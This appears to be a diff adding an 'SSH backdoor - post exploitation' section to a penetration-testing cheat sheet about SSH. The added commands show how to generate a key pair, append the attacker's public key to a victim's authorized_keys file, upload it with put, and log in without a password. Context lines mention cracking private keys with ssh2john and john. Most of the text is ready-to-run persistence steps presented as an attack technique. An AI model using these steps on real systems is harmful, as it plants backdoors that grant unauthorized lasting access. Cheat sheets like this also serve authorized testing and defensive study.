@@ -1,3 +1,27 @@
+SSH backdoor - post exploitation
+# Attacker
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+# Victim
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+# Connect
+ssh -i <FILENAME> <USER>@<IP>
+
+# Generate ssh key pair
+ssh-keygen
+cp id_rsa.pub /tmp/authorized_keys
+
+# Transfer attacker public key to host
+put /tmp/authorized_keys
+exit
+
+# Login to SSH server with no password
+SSH_AUTH_SOCK=0 ssh user@192.168.0.20
+
+
 SSH (22) 
 id_rsa.pub: Public key that can be used in authorized_keys for login. 
 id_rsa: Private key that is used for login. Might ask for password, can be crackied with ssh2john and john
